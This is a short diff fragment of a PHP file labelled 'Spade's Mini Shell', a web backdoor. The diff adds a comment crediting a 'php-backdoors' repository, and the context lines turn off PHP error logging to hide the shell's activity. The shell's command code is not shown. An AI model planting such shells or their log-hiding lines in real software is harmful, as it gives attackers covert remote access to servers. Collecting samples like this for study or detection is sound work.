@@ -1,4 +1,5 @@
 <?php
+// from https://github.com/1337r0j4n/php-backdoors
 	// Spade's Mini Shell
 	@ini_set('error_log',NULL); 
 	@ini_set('log_errors',0); 
